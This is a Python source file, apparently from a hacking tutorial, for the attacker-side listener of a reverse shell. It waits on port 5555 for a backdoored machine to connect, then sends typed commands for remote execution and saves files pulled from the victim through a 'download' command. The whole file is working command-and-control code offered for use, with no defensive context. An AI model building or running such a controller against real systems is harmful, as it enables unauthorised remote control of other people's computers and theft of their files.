import socket , json , base64

class Listener :

    def __init__(self , ip , port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[*] Listening for incoming connections...")
        self.connection , self.address = listener.accept()
        print("[*] Connection established!")

    def reliable_send(self , data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(4096).decode()
                return json.loads(json_data)
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                continue
            
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        
        return self.reliable_receive()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # base64 decode karke 
    
    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            result = self.execute_remotely(command)
            if(command[0] == "download"):
                self.write_file(command[1] , result)

            print(result, end="")

my_listener = Listener("0.0.0.0" , 5555)
my_listener.run()


